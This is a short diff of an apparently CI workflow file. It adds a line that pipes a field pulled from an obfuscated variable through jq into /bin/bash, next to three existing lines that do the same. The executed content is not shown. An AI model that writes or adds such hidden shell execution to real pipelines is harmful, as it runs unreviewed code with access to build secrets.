@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$twp209" | jq -r .lmtnw18 | /bin/bash
           printf '%s' "$gql4" | jq -r .j319 | /bin/bash
           printf '%s' "$e1" | jq -r .ki2 | /bin/bash
+          echo $gcda347 | jq -r .hgc6318 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
